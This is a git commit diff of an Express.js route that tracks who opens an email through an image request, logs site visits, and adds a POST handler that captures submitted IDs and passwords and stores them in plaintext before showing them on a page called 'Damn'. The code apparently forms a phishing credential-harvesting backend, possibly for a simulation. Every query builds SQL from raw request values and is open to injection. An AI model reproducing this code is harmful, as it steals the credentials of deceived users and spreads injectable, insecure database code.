7428d07b87194df2ea2bc69cb301d008371ac98a
dogyun <a2256014@gmail.com>
2023-06-20 17:02:17 +0900

    second

--- routes/index.js
+++ routes/index.js
@@ -16,10 +16,12 @@ router.get('/', function(req, res, next) {
     const base64Image = Buffer.from(image).toString('base64');
 
     var currentDate = new Date();
-    var currentDateTimeString = currentDate.toISOString().slice(0, 19).replace('T', ' ');
+    var currentDateString = currentDate.toString();
+
     //이메일 열람한 사람
-    db.query(`INSERT INTO viewMail ${readUser}, ${currentDateTimeString}`,function(error, results){
+    db.query(`INSERT INTO viewMail VALUES ('${readUser}', '${currentDateString}')`,function(error, results){
       if(error){
+        console.log(error);
         throw error;
       }
     })
@@ -28,9 +30,35 @@ router.get('/', function(req, res, next) {
     res.set('Content-Type', 'image/png');
     res.send(Buffer.from(base64Image, 'base64'));
   }else{
+
+    //페이지 들어온사람
+    db.query(`INSERT INTO inSite VALUES ('${readUser}', '${currentDateString}')`, function(error, results){
+      if(error){
+        console.log(error);
+        throw error;
+      }
+    })
     //여기선 페이지를 보여주고 싶어
-    res.render('index', { title: 'SK' });
+    res.render('index', { title: 'SK', user: `${readUser}`});
   }
 });
+
+router.post('/', function(req, res, next) {
+  const readUser = req.query.frame;
+  const id = req.body.id;
+  const passwd = req.body.passwd.toString();
+
+  var currentDate = new Date();
+  var currentDateString = currentDate.toString();
+
+  db.query(`INSERT INTO inData VALUES ('${readUser}', '${id}', '${passwd}', '${currentDateString}')`, function(error, results){
+    if(error){
+      console.log(error);
+      throw error;
+    }
+  })
+
+  res.render('Damn',{id: `${id}`, passwd: `${passwd}`});
+})
 
 module.exports = router;
